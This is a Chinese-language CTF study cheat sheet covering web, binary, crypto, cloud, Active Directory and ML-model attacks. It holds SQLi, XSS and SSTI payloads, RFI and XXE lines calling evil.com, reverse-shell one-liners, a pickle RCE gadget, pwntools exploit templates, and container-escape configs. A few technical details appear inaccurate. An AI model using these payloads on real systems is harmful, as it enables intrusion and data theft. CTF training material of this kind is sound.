# CTF 知识库

## 目录
- [Web 安全](#web-安全)
- [密码学 (Crypto)](#密码学-crypto)
- [逆向工程 (Reverse/Pwn)](#逆向工程-reversepwn)
- [杂项 (Misc)](#杂项-misc)
- [取证 (Forensics)](#取证-forensics)
- [移动安全 (Mobile)](#移动安全-mobile)
- [常用工具](#常用工具)

---

## Web 安全

### SQL 注入 (SQLi)

**基础原理：**
- 将恶意SQL代码插入到查询字符串中
- 目标：绕过认证、提取数据、读写文件

**常见类型：**
1. **错误注入 (Error-based)**
   - 通过报错信息提取数据
   - MySQL: `EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))`
   - PostgreSQL: `CAST((SELECT version()) AS INT)`

2. **联合注入 (Union-based)**
   - 使用 UNION 合并查询结果
   - 要求：列数相同、前语句无错误
   - 例子：`' UNION SELECT 1,2,3--`

3. **布尔盲注 (Boolean Blind)**
   - 通过页面真假响应推断数据
   - 例子：`' AND 1=1--` (返回正常)
   - 脚本化：逐字符爆破

4. **时间盲注 (Time Blind)**
   - 通过响应时间延迟推断数据
   - MySQL: `' AND SLEEP(5)--`
   - PostgreSQL: `' AND pg_sleep(5)--`

**常用函数（MySQL）：**
- `database()` - 当前数据库
- `user()` - 当前用户
- `version()` - 数据库版本
- `@@basedir` - 安装目录
- `@@datadir` - 数据目录
- `load_file('/etc/passwd')` - 读文件
- `into outfile` - 写文件

**绕过技巧：**
- 大小写绕过：`SELECT` → `SeLeCt`
- 注释绕过：`#` → `-- ` (注意空格) 或 `/**/`
- 空格绕过：`%09`, `%0a`, `/**/`
- WAF绕过：内联注释 `SEL/**/ECT`

**防护：**
- 使用预编译语句（参数化查询）
- 输入验证和过滤
- 最小权限原则

---

### XSS (跨站脚本)

**类型：**
1. **反射型 XSS** - 恶意代码在URL中，服务器反射回响应
2. **存储型 XSS** - 恶意代码存储在数据库，其他用户访问时执行
3. **DOM XSS** - 恶意代码在前端DOM操作中执行

**常用 Payload：**
- 基础：`<script>alert(1)</script>`
- 属性注入：`<img src=x onerror=alert(1)>`
- 事件：`<body onload=alert(1)>`
- SVG：`<svg onload=alert(1)>`
- 伪协议：`<iframe src="javascript:alert(1)">`

**XSS 过滤绕过：**
- 大小写：`<ScRiPt>`
- 双写：`<scrscriptipt>`
- 编码：URL编码、HTML实体编码、Unicode编码
- 无脚本标签：`<img src=x onerror=alert(1)>`
- 注释：`<scri<!-- -->pt>`

**CORS (跨域资源共享)：**
- 允许跨域资源共享
- 配置不当可导致敏感数据泄露
- 检查：`Origin`, `Access-Control-Allow-Origin`

**CSRF (跨站请求伪造)：**
- 用户不知情下执行非本意操作
- 防护：CSRF Token、SameSite Cookie、Referer验证

---

### 哈希碰撞与弱哈希

**常见弱哈希：**
- MD5 - 已碰撞，不安全
- SHA1 - 已碰撞
- CRC32 - 非加密哈希，极易碰撞

**哈希长度扩展攻击：**
- 适用于 `hash(secret + message)` 模式
- 工具：`hashpump` (Python)

**密码哈希破解：**
- 工具：`hashcat`, `John the Ripper`
- 字典攻击：使用常见密码字典
- 彩虹表：预计算哈希值表
- 掩码：基于模式的攻击

---

### 文件包含

**本地文件包含 (LFI)：**
- PHP: `include($_GET['file'])`
- 读取文件：`?file=/etc/passwd`
- 日志投毒：在日志中写入PHP代码，然后包含
- Session文件：`/var/lib/php/sessions/...`

**远程文件包含 (RFI)：**
- 需要 `allow_url_include=On`
- 执行远程代码：`?file=http://evil.com/shell.php`

**PHP 伪协议：**
- `php://filter/` - 文件读取：`php://filter/convert.base64-encode/resource=index.php`
- `data://` - 数据流：`data://text/plain,<?php phpinfo()?>`
- `php://input` - POST数据
- `expect://` - 命令执行

**绕过：**
- 路径遍历：`../../../`
- NULL字节截断：`%00` (PHP < 5.3.4)
- 编码：URL编码、双编码

---

### 命令注入

**基础：**
- PHP: `system()`, `exec()`, `passthru()`, `shell_exec()`, `eval()`
- Python: `os.system()`, `subprocess.run()`, `eval()`, `exec()`
- Node.js: `eval()`, `child_process.exec()`

**常用 Payload：**
- Linux: `; cat /etc/passwd`, `| cat /etc/passwd`, `&& cat /etc/passwd`, `$(cat /etc/passwd)`
- Windows: `& type C:\\Windows\\win.ini`, `| type C:\\Windows\\win.ini`

**绕过：**
- 空格：`$IFS$1`, `${IFS}`, `%09`, `%0a`
- 黑名单绕过：`ca''t`, `ca\t`
- 编码：Base64、URL编码

**反引号执行：**
- PHP: `` `ls` `` 
- Bash: `` `ls` ``

---

### JWT (JSON Web Token)

**结构：**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```
- Header: 算法和类型
- Payload: 数据（Base64编码）
- Signature: 签名（Header.Payload + Secret）

**攻击方法：**
1. **空签名** - 将签名置空，检查是否绕过
2. **算法混淆** - 将 `alg` 改为 `none`
3. **弱密钥** - 爆破密钥（字典、彩虹表）
4. **密钥注入** - 利用已知密钥
5. **公钥替换** - 替换为你自己的公钥

**工具：** `jwt_tool`, `c-jwt-cracker`

---

### SSTI (服务端模板注入)

**常见模板引擎：**

**Jinja2 (Python Flask):**
- Payload: `{{7*7}}` → `49`
- RCE: `{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}`
- 常见链：`__class__`, `__mro__`, `__subclasses__`, `__globals__`

**Twig (PHP):**
- Payload: `{{_self.env.display("id")}}`
- RCE: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`

**Eruby (Ruby):**
- Payload: `<%= system("ls") %>`

**检测方法：**
- 注入 `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`
- 观察响应中的计算结果

---

### XML/XXE (XML外部实体注入)

**基础攻击：**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

**Blind XXE (OOB):**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">
  %xxe;
]>
```

**PHP 伪协议：**
- `php://filter/convert.base64-encode/resource=index.php`

**防御：**
- 禁用外部实体
- 使用更安全的解析器

---

### SSRF (服务端请求伪造)

**内网扫描：**
- `?url=http://127.0.0.1:22`
- `?url=http://localhost:6379` (Redis)
- `?url=file:///etc/passwd`

**绕过技巧：**
- IP地址转换：`127.0.0.1` → `2130706433`, `0177.0.0.1`
- DNS rebinding
- URL scheme: `http://`, `file://`, `dict://`, `gopher://`

**Gopher 协议攻击：**
- 可以伪造TCP/UDP连接
- 常用于攻击Redis、MySQL等

---

### 反序列化

**Python Pickle：**
```python
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

print(base64.b64encode(pickle.dumps(RCE())))
```

**PHP 反序列化：**
- `__wakeup()`, `__destruct()` 魔术方法
- 工具：`phpggc`
- 常见链：POP链（POP 1、POP 3等）

**Java 反序列化：**
- ysoserial 工具生成 payload
- CommonsCollections、CommonsBeanutils 等利用链

---

### Session 安全

**Session 固定：**
- 攻击者提供已知 session ID，用户登录后 session 不变
- 防护：登录后重新生成 session

**Session 劫持：**
- 通过 XSS 或网络嗅探获取 session cookie
- 防护：HttpOnly、Secure 标志

**Flask Session 篡改：**
- Flask session 使用 Base64 编码 + 签名
- 工具：`flask-unsign`
- 爆破 secret key 后可篡改 session

---

## 密码学 (Crypto)

### 古典密码

**凯撒密码 (Caesar Cipher)：**
- 简单的字符移位
- 爆破：尝试所有25种偏移

**维吉尼亚密码 (Vigenère Cipher)：**
- 使用密钥进行移位
- 频率分析破解

**栅栏密码 (Rail Fence)：**
- 之字形写，按行读
- 根据栏数解密

**培根密码 (Bacon's Cipher)：**
- A/B 编码，每5个字母代表一个字符

---

### 现代密码学

**AES (高级加密标准)：**
- 分组密码，128/192/256位密钥
- 模式：ECB、CBC、CTR、GCM
- ECB 模式不安全（相同明文块产生相同密文块）

**RSA：**
- 非对称加密
- 基于大数分解困难性
- 常见攻击：
  - 小指数攻击：e=3 或 e=65537
  - 共模攻击：相同 n，不同 e
  - 维纳攻击：d 太小
  - 已知明文攻击

**哈希函数：**
- MD5、SHA1（已不安全）
- SHA-256、SHA-3（推荐）
- Merkle–Damgård 结构
- 长度扩展攻击（针对 Merkle–Damgård 结构）

---

### 流密码

**RC4：**
- 有偏差，不建议使用
- IV 不能重复使用

**ChaCha20：**
- 现代安全的流密码
- 优于 RC4

---

### 密码学攻击

**碰撞攻击：**
- 寻找两个不同输入产生相同哈希值
- MD5、SHA1 已失效

**长度扩展攻击：**
- `Hash(K || M)` 可扩展
- HMAC 可防止

**选择密文攻击 (CCA)：**
- 攻击者可以解密任意密文
- 公钥密码学需要 CCA 安全

---

## 逆向工程 (Reverse/Pwn)

### 基础概念

**ELF 文件：**
- Linux 可执行文件
- 段：text（代码）、data（数据）、bss（未初始化数据）

**PE 文件：**
- Windows 可执行文件
- 节：.text、.data、.rdata、.idata

---

### 缓冲区溢出

**栈溢出基础：**
```c
void vulnerable() {
    char buffer[64];
    gets(buffer);  // 不检查边界
}
```
- 覆盖返回地址
- 跳转到 shellcode

**Shellcode：**
- 机器码，执行命令
- Linux: `execve("/bin/sh", NULL, NULL)`
- 生成工具：`pwntools.shellcraft`

**ROP (返回导向编程)：**
- 利用程序中已有的代码片段（gadget）
- 避免 NX/DEP 保护
- 常见 gadget：`pop rdi; ret;`, `ret;`

**工具：**
- `ROPgadget` - 查找 ROP gadget
- `pwntools` - Python 框架
- `checksec` - 检查保护机制

---

### 保护机制

**NX / DEP (不可执行)：**
- 栈/堆不可执行
- 绕过：ROP、堆喷射

**ASLR (地址空间布局随机化)：**
- 随机化地址
- 绕过：信息泄露、ROP

**Stack Canaries (金丝雀)：**
- 检测栈溢出
- 值：随机数、`0x28`、`null`

**PIE (位置无关可执行)：**
- 代码段地址随机化

**RELRO (重定位只读)：**
- Partial: GOT 表可写
- Full: GOT 表不可写

---

### 格式化字符串漏洞

**原理：**
```c
printf(user_input);  // 用户控制格式字符串
```
- `%s` - 读内存
- `%n` - 写内存
- `%x` - 弹出栈值

**利用：**
1. 泄露地址（获取 libc 基址）
2. 覆盖 GOT 表项
3. 覆盖返回地址

**Payload：**
- 读：`%p%p%p%p`
- 写偏移 n：`%n`
- 写任意地址：`AAAA%k$n` (AAAA 是地址)

---

### 整数溢出

**有符号整数溢出：**
```c
int a = 0x7fffffff;
int b = a + 1;  // b = -2147483648
```

**无符号整数溢出：**
```c
unsigned int a = 0xffffffff;
unsigned int b = a + 1;  // b = 0
```

**利用：**
- 绕过长度检查
- 负数索引

---

### 堆漏洞

**UAF (Use After Free)：**
- 使用已释放的内存
- 可劫持函数指针

**Double Free：**
- 释放同一块内存两次
- 可导致堆溢出

**Heap Overflow：**
- 覆盖相邻堆块的元数据
- 可控制堆分配

**House of Spirit / House of Force：**
- 堆利用技术

---

### 工具

**调试器：**
- GDB
- pwndbg: `gdb -ex "source /usr/share/pwndbg/gdbinit.py"`
- gef: `g -source gef.py`

**反汇编工具：**
- `objdump -d binary`
- `ndisasm -b 32 binary`
- IDA Pro (付费)
- Ghidra (免费，推荐)

**工具集：**
- `pwntools` - Python CTF 框架
- `one_gadget` - 查找 one gadget RCE
- `libc-database` - 查找 libc 版本

---

## 杂项 (Misc)

### 隐写术

**图片隐写：**
- LSB 隐写：最低有效位
- 工具：`stegsolve`, `zsteg`

**Exif 信息：**
- 图片元数据
- 工具：`exiftool`

**音频隐写：**
- 频谱分析
- 工具：`sonic visualiser`

---

### 编码与解码

**Base64：**
- `ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/`
- `=` 填充

**URL 编码：**
- `%XX` 格式
- `+` 代表空格

**HTML 实体编码：**
- `&#数字;` 或 `&#x十六进制;`

**Unicode 编码：**
- `\uXXXX`

**ROT13：**
- 凯撒密码，偏移13

**ASCII / Hex / Binary 转换：**
- Python: `chr()`, `ord()`, `hex()`, `bin()`
- CyberChef

---

### 压缩文件

**Zip 伪加密：**
- 修改加密标志位
- 工具：`zip伪加密修复`

**明文攻击：**
- 已知部分明文
- 可获取加密密钥

---

### 流量分析

**Wireshark：**
- 网络流量分析
- 追踪TCP流：`右键 -> Follow -> TCP Stream`

**Tshark：**
- 命令行流量分析
- `tshark -r file.pcap -Y "http.request" -T fields -e http.file_data`

---

### 其他

**Brainfuck：**
- 8个指令：`> < + - . , [ ]`
- esolang

**Piet：**
- 图形编程语言

**Morse Code：**
- 点划编码

**QR Code：**
- 二维码解码
- 工具：`zbar` 或在线工具

---

## 取证 (Forensics)

### 磁盘镜像

**工具：**
- `dd` - 复制/转换磁盘
- `binwalk` - 固件分析
- `volatility` - 内存取证

**常用命令：**
```bash
strings image.img | grep flag
binwalk -e image.img
```

---

### 内存取证

**Volatility：**
```
volatility -f memory.dmp --profile=Win7SP1x64 pslist
volatility -f memory.dmp --profile=Win7SP1x64 memdump -p <PID> -D output/
```

**常用插件：**
- `pslist` - 进程列表
- `memdump` - 导出进程内存
- `console` - 控制台历史

---

## 移动安全 (Mobile)

### Android 逆向

**工具：**
- `apktool` - 反编译 APK
- `jadx` - 反编译为 Java 代码
- `frida` - 动态插桩
- `adb` - Android Debug Bridge

**常用命令：**
```bash
apktool d app.apk
jadx app.apk
adb shell
adb logcat
```

**Frida 脚本：**
```javascript
Java.perform(function() {
    var cls = Java.use("com.example.Class");
    cls.method.implementation = function() {
        console.log("method called");
        return this.method();
    }
});
```

---

### iOS 逆向

**工具：**
- `class-dump` - 导出类结构
- `Hopper` - 反汇编工具
- `IDA Pro` - 专业反汇编
- `frida-ios-dump` - 砸壳

---

## 常用工具

### Web
- `Burp Suite` - Web渗透测试
- `sqlmap` - SQL注入自动化
- `dirsearch` - 目录扫描
- `nmap` - 端口扫描
- `curl` / `wget` - HTTP请求

### 密码学
- `openssl` - 加密工具
- `hashcat` - 哈希破解
- `John the Ripper` - 密码破解
- `CyberChef` - 在线编码/解码

### Pwn/Reverse
- `pwntools` - Python CTF框架
- `ROPgadget` - ROP gadget 查找
- `one_gadget` - one gadget RCE
- `checksec` - 检查保护机制
- `GDB + pwndbg/gef` - 调试
- `Ghidra` - 反汇编
- `IDA Pro` - 专业反汇编

### 杂项
- `zsteg` - 图片隐写
- `exiftool` - Exif信息
- `strings` - 提取字符串
- `binwalk` - 固件分析
- `Wireshark` - 流量分析

### 在线资源
- CyberChef: https://gchq.github.io/CyberChef/
- CrackStation: https://crackstation.net/
- HashCat 在线：https://hashcat.net/hashcat/

---

## Pwntools 快速参考

```python
from pwn import *

# 连接
r = process('./binary')
# r = remote('host', port)

# 生成 payload
context.arch = 'amd64'
shellcode = shellcraft.sh()
payload = asm(shellcode)

# 交互
r.send(payload)
r.sendlineafter(b'prompt', payload)
r.interactive()

# ELF 操作
e = ELF('./binary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
main = e.symbols['main']
got_write = e.got['write']

# ROP
rop = ROP(e)
rop.call(e.symbols['system'], [next(e.search(b'/bin/sh'))])
```

---

## Tips

1. **先枚举**：信息搜集是第一步
2. **阅读源码**：如果有源码，仔细阅读
3. **检查保护**：`checksec binary`
4. **Fuzz测试**：用模糊测试找漏洞
5. **看报错**：错误信息是提示
6. **动调结合**：静态分析 + 动态调试
7. **写脚本**：自动化重复任务
8. **查阅文档**：不懂就查
9. **记录**：写 Writeup，总结经验
10. **多练习**：熟能生巧

---

## 中文学习资源

### 中文教程
- **Hello-CTF** - 0基础CTF入门教程，中文
- **CTF-All-In-One** - CTF竞赛权威指南
- **CTF-Wiki (中文版)** - https://ctf-wiki.org/
- **1earn** - ffffffff0x团队的安全知识框架

### 在线平台
- **BUUCTF** - https://buuoj.cn/ (国内常用)
- **攻防世界** - https://adworld.xctf.org.cn/
- **Bugku** - https://bugku.com/
- **CTFHub** - https://ctfhub.com/

### 实战靶场
- **PicoCTF** - https://picoctf.org/
- **HackTheBox** - https://www.hackthebox.eu/
- **TryHackMe** - https://tryhackme.com/
- **VulnHub** - https://www.vulnhub.com/

---

## 常见题型解题思路

### Web 题型
1. **源码泄露**：
   - 查看页面源代码
   - 访问 `.git`, `/.git`, `/backup`, `/www.zip`
   - robots.txt, .DS_Store

2. **SQL 注入**：
   - 先测试 `id=1'` 看是否有报错
   - 尝试 `union select` 查列数
   - 根据报错或盲注推断数据库结构

3. **XSS**：
   - 输入 `<script>alert(1)</script>`
   - 查看是否过滤
   - 尝试绕过：大小写、双写、编码

4. **文件上传**：
   - 测试上传 `.php`, `.phtml`, `.jpg.php`
   - 00截断：`shell.php%00.jpg`
   - MIME绕过：修改Content-Type

5. **命令注入**：
   - 测试 `;`, `|`, `&&`, `$()`
   - 查看回显，盲注使用 `sleep()`

### Pwn 题型
1. **栈溢出**：
   - 先看保护：`checksec`
   - 找到溢出点：`cyclic 100` 生成测试字符串
   - 计算 offset
   - 构造 ROP chain

2. **格式化字符串**：
   - 输入 `%p%p%p%p` 泄露栈内容
   - 找到偏移
   - 使用 `%n` 写任意地址

3. **UAF / Double Free**：
   - 分析堆管理
   - 利用 fastbin attack

### Crypto 题型
1. **古典密码**：
   - 识别模式（维吉尼亚、栅栏等）
   - 在线工具或脚本解密

2. **RSA**：
   - 小e爆破
   - 共模攻击
   - 已知明文攻击

3. **哈希**：
   - 弱密码 hashcat 爆破
   - 找碰撞

### Misc 题型
1. **图片隐写**：
   - `binwalk -e` 提取
   - `stegsolve` 查看通道
   - `zsteg` 检测PNG隐写

2. **流量分析**：
   - Wireshark 打开
   - Follow TCP Stream
   - 看HTTP内容

3. **编码**：
   - 根据格式判断（Base64、URL、Hex）
   - 多层编码要多次解密

---

## Pwntools 常用模板

### 基础模板
```python
from pwn import *

context.log_level = 'debug'

# 本地调试
r = process('./binary')
# 远程连接
# r = remote('host', port)

# ELF 分析
e = ELF('./binary')

# libc 分析
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def exploit():
    # 生成 cyclic pattern
    pattern = cyclic(100)
    r.sendline(pattern)
    
    # 接收并计算 offset
    r.wait()
    core = r.corefile()
    offset = cyclic_find(core.fault_addr)
    log.info(f'Offset: {offset}')
    
    # 构造 payload
    payload = b'A' * offset
    payload += p64(e.symbols['win'])
    
    r.sendline(payload)
    r.interactive()

if __name__ == '__main__':
    exploit()
```

### 格式化字符串攻击
```python
from pwn import *

r = process('./binary')

# 泄露地址
payload = b'%p%p%p%p%p'
r.sendline(payload)
response = r.recvuntil(b'\n')
print(response)

# 格式化字符串写入
# 格式：地址 + padding + %{offset}$n
addr = 0xdeadbeef
offset = 10
fmt = p32(addr) + b'%' + str(offset).encode() + b'$n'
r.sendline(fmt)

r.interactive()
```

### Ret2libc
```python
from pwn import *

r = process('./binary')
e = ELF('./binary')

# 泄露 libc 地址
payload = b'A' * offset + p64(e.plt['puts']) + p64(e.symbols['main']) + p64(e.got['puts'])
r.sendline(payload)

puts_addr = u64(r.recvline().strip().ljust(8, b'\x00'))
log.info(f'puts address: {hex(puts_addr)}')

# 计算 libc 基址
libc_base = puts_addr - libc.symbols['puts']
log.info(f'libc base: {hex(libc_base)}')

# 调用 system('/bin/sh')
system_addr = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

payload = b'A' * offset
payload += p64(system_addr)
payload += p64(0xdeadbeef)  # return address
payload += p64(binsh)

r.sendline(payload)
r.interactive()
```

---

## 常用命令速查

### Linux
```bash
# 文件搜索
find / -name "flag*" 2>/dev/null
find / -type f -perm /111 2>/dev/null  # 查找可执行文件

# 进程
ps aux
top
strace -p <pid>  # 系统调用跟踪

# 网络
netstat -antp
ss -antp
curl -I http://target.com

# 反弹 shell
bash -i >& /dev/tcp/攻击者IP/端口 0>&1
nc -e /bin/bash 攻击者IP 端口
```

### Python
```python
# 编码
import base64, hashlib, binascii

base64.b64encode(b'hello')
base64.b64decode(b'aGVsbG8=')

hashlib.md5(b'hello').hexdigest()
hashlib.sha256(b'hello').hexdigest()

binascii.hexlify(b'hello')
binascii.unhexlify(b'68656c6c6f')

# Pwntools
from pwn import *
p64(0xdeadbeef)  # pack
u64(b'\xef\xbe\xad\xde\x00\x00\x00\x00')  # unpack
cyclic(100)  # 生成测试字符串
shellcraft.sh()  # 生成shellcode
```

### 常用端口
- 22: SSH
- 80/443: HTTP/HTTPS
- 3306: MySQL
- 5432: PostgreSQL
- 6379: Redis
- 27017: MongoDB
- 11211: Memcached

---

## CTF Flag 格式
常见格式：
- `flag{...}`
- `FLAG{...}`
- `ctf{...}`
- `HackTheBox{...}`
- `picoCTF{...}`
- `flag{md5hash}`

---

## 高级 Web 安全

### API 安全

**GraphQL 注入：**
```graphql
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
```
- 内省查询获取 schema
- 注入点：query、mutation、subscription
- 工具：`graphql-map`, `graphql-ide`

**REST API 攻击：**
- IDOR (不安全的直接对象引用)
  - `/api/users/123` → 改为 `/api/users/124`
- 批量赋值
- 速率限制绕过

---

### 认证授权绕过

**OAuth 2.0 漏洞：**
- 弱 secret key
- redirect_uri 篡改
- state 参数缺失（CSRF）
- 公钥伪造

**JWT 高级攻击：**
- Algorithm confusion: `RS256` → `HS256`
- Key injection: 注入公钥作为密钥
- JWKS manipulation: 篡改密钥服务器
- Token reuse

**Session 高级技巧：**
- Session fixation
- Session prediction（可预测的 session ID）
- Race condition（竞态条件）

---

### NoSQL 注入

**MongoDB 注入：**
```javascript
// 用户名: {"$ne": null}
// 密码: {"$ne": null}
db.users.find({username: {"$ne": null}, password: {"$ne": null}})
```
- 操作符：`$ne`, `$gt`, `$lt`, `$regex`, `$where`
- `$where` 执行 JavaScript

**Redis 注入：**
- SSRF 操作 Redis
- 命令执行：`CONFIG SET dir /var/www/html`
- 持久化：`FLUSHALL` + `SET shell "<?php system($_GET[1]) ?>"`

---

### WebSocket 安全

**攻击方式：**
- 消息注入
- Origin 绕过
- 跨站 WebSocket 劫持 (CSWSH)

**测试：**
```javascript
var ws = new WebSocket("ws://target/ws");
ws.onmessage = function(msg) {
    console.log(msg.data);
};
ws.send("test");
```

---

### HTTP/2 和 HTTP/3

**HTTP/2 攻击：**
- HPACK Bomb（压缩攻击）
- Cache poisoning（缓存投毒）
- Request smuggling（请求走私）

**HTTP/3 (QUIC) 安全：**
- 零 RTT 攻击
- 连接迁移滥用

---

### 浏览器安全

**CSP (Content Security Policy) 绕过：**
```html
<!-- script-src 允许 domain.com -->
<script src="https://domain.com/evil.js"></script>

<!-- frame-src 'self' -->
<iframe srcdoc="<script>eval('alert(1)')</script>"></iframe>
```

**SameSite Cookie 绕过：**
- 跨站子域名
- 浏览器旧版本
- 移动端浏览器

**SOP (同源策略) 利用：**
- postMessage 注入
- CORS misconfiguration
- DNS rebinding

---

### Docker 安全

**Docker 逃逸：**
```bash
# 挂载宿主机目录
docker run -v /:/host -it ubuntu

# 特权容器
docker run --privileged -it ubuntu

# Socket 挂载
docker run -v /var/run/docker.sock:/var/run/docker.sock -it ubuntu
```

**CVE-2019-5736 (runC 逃逸)：**
- 在 exec 时覆盖 runC 二进制

---

### Kubernetes 安全

**K8s 逃逸：**
```yaml
# 挂载宿主机路径
apiVersion: v1
kind: Pod
metadata:
  name: evil-pod
spec:
  containers:
  - name: evil
    image: ubuntu
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
```

**RBAC 绕过：**
- 绑定到 cluster-admin
- create pod 权限
- exec 权限

---

### 云安全

**AWS 攻击：**
- SSRF 访问 AWS 元数据：`http://169.254.169.254/latest/meta-data/`
- S3 Bucket 遍历
- Lambda RCE
- IAM 权限提升

**GCP 攻击：**
- 元数据服务：`http://metadata.google.internal/computeMetadata/v1/`
- Cloud Storage 访问
- Cloud Functions RCE

**Azure 攻击：**
- MSI (Managed Service Identity) 滥用
- Instance Metadata Service
- Key Vault 访问

---

### IoT 安全

**常见漏洞：**
- 固件未加密
- 默认凭据
- 硬编码密钥
- 固件更新劫持

**工具：**
- `firmadyne` - 固件分析
- `firmware-mod-kit` - 固件修改
- `binwalk` - 固件提取

**Mirai 僵尸网络：**
- 弱口令爆破
- 感染 IoT 设备
- DDoS 攻击

---

## 高级密码学

### 椭圆曲线密码学 (ECC)

**ECDSA 签名伪造：**
- 私钥泄露
- 重放攻击
- 随机数重用 (nonce reuse)
- 缺少随机数 (k=0, k=1)

**ECDH 密钥交换：**
- 小 subgroup 攻击
- Invalid curve attack
- 恶意曲线参数

**侧信道攻击：**
- 时间攻击
- 功耗分析 (DPA/SPA)
- 故障注入

---

### 量子密码学

**后量子密码学：**
- NTRU
- Kyber (基于格)
- Dilithium (签名)
- SPHINCS+ (无状态哈希签名)

**RSA/ECC 在量子时代的脆弱性：**
- Shor 算法可分解大整数
- ECDLP 可被破解

---

### 同态加密

**概念：**
- 可在密文上直接计算
- 结果解密后等于明文计算

**应用：**
- 隐私保护机器学习
- 云计算隐私保护
- 电子投票

---

### 零知识证明 (ZKP)

**ZK-SNARK：**
- 零知识简洁非交互知识论证
- 应用：Zcash、隐私保护区块链
- Setup 信任问题

**ZK-STARK：**
- 可扩展的透明论证
- 无需可信设置

**应用：**
- 证明已知 x 满足条件而不泄露 x
- 身份验证
- 可信计算

---

### 多方安全计算 (MPC)

**概念：**
- 多方协同计算，各自输入保密
- 最终结果共享

**协议：**
- Shamir 秘密共享
- Garbled circuits (姚氏混淆电路)
- BGW 协议

---

## 网络安全

### 内网渗透

**横向移动：**
- SMB/NetBIOS 枚举
- RPC 利用
- WMI/PowerShell 远程执行
- Pass-the-Hash / Pass-the-Ticket
- Golden Ticket / Silver Ticket

**权限提升：**
```
# Windows
whoami /priv
systeminfo
icacls C:\Windows\System32\config\SAM

# Linux
sudo -l
cat /etc/sudoers
find / -perm -u+s -type f 2>/dev/null
```

**Kerberos 攻击：**
- AS-REP Roasting
- Kerberoasting
- Delegation Attack (Unconstrained/Constrained)
- Pass-the-Ticket

---

### 域安全 (AD)

**Active Directory 攻击：**
- 票据授予 (TGT/TGS)
- SPN 扫描
- DCSync 模拟域控制器
- GPO 劫持

**工具：**
- `BloodHound` - AD 关系图分析
- `Impacket` - Python 协议库
- `Mimikatz` - 凭据提取
- `Rubeus` - Kerberos 操作

---

### 隧道与代理

**技术：**
- SSH 隧道：`ssh -L 8080:target:80 user@jump`
- HTTP/HTTPS 隧道：`reGeorg`, `abptts`
- SOCKS 代理：`proxychains`
- DNS 隧道：`dnscat2`, `iodine`
- ICMP 隧道：`ptunnel`

---

### 中间人攻击

**ARP 欺骗：**
- `arpspoof -i eth0 -t target gateway`
- `arpspoof -i eth0 -t gateway target`

**DNS 欺骗：**
- `dnsspoof -i eth0 -f hosts.txt`

**ICMP 重定向：**
- 发送虚假 ICMP 重定向消息

---

## 高级二进制漏洞

### Linux 内核漏洞

**常见类型：**
- Stack overflow
- Use-after-free (UAF)
- Double fetch
- Race condition (TOCTOU)
- Null pointer dereference

**利用技术：**
- ROP from kernel
- modprobe_path
- userfaultfd
- Dirty COW (CVE-2016-5195)

**工具：**
- `Syzkaller` - 模糊测试
- `KASLR bypass` - 地址泄露
- `kernel ROP` - 内核ROP

---

### 虚拟化逃逸

**VMware 逃逸：**
- Guest 到 Host 漏洞
- CVE-2018-6981, CVE-2018-6948

**QEMU/KVM 逃逸：**
- VirtIO 漏洞
- Slirp 网络逃逸
- CVE-2019-14378

**Xen 逃逸：**
- XSA 漏洞
- PV/Ops 不当

---

### 浏览器 Exploit

**Browser Pwn 常见技术：**
- JIT 溢出 (V8, SpiderMonkey)
- Array.prototype.sort
- TypedArray
- WebAssembly 滥用
- DOM 结构混淆

**利用：**
- 信息泄露
- JIT 喷射
- ROP 到系统调用
- WebAsm ROP

---

### 固件与 IoT 漏洞

**路由器固件：**
- MIPS/ARM 架构
- 常见命令注入
- 配置文件泄露

**工具：**
- `firmware-analysis-toolkit` (FAT)
- `emulate_mipsel` - MIPS 模拟器

---

## 侧信道攻击

### 时序攻击

**密码比较：**
```c
// 不安全 - 返回时间与比较字符数相关
int insecure_compare(char* a, char* b) {
    for (int i = 0; i < len; i++) {
        if (a[i] != b[i]) return 0;
        sleep(1);
    }
    return 1;
}
```

**RSA 签名时序：**
- CRT 实现漏洞
- Bleichenbacher 攻击

---

### 故障注入

**激光/电压故障：**
- 导致指令跳过
- 寄存器翻转
- 签名伪造

**Rowhammer：**
- 物理内存位翻转
- 密钥泄露
- 权限提升

---

### 电磁侧信道

**原理：**
- 处理器功耗变化
- 射频泄漏
- 声学侧信道

**防御：**
- 恒定时间实现
- 随机化
- 物理屏蔽

---

## AI/ML 安全

### 对抗样本 (Adversarial Examples)

**白盒攻击：**
- FGSM (Fast Gradient Sign Method)
- PGD (Projected Gradient Descent)
- C&W attack

**黑盒攻击：**
- NES (Natural Evolution Strategy)
- ZOO (Zeroth Order Optimization)

**防御：**
- 对抗训练
- 防御蒸馏
- 检测机制

---

### 模型窃取 (Model Extraction)

**攻击场景：**
- 查询 API 获取输出
- 重建模型
- 训练代理模型

---

### 模型反演 (Model Inversion)

**从输出推断输入：**
- 人脸识别隐私泄露
- 医疗数据重构

---

### 联邦学习攻击

**投毒攻击：**
- 恶意客户端更新
- 全局模型污染

**后门攻击：**
- 触发器注入
- 特定输入输出篡改

---

## 区块链安全

### 智能合约漏洞

**常见问题：**
```solidity
// 重入攻击
function withdraw(uint amount) {
    require(balances[msg.sender] >= amount);
    (bool sent, ) = msg.sender.call{value: amount}("");
    require(sent);
    balances[msg.sender] -= amount;  // 应该在 call 前
}

// 整数溢出
function buy() {
    balances[msg.sender] += 100;
}
```

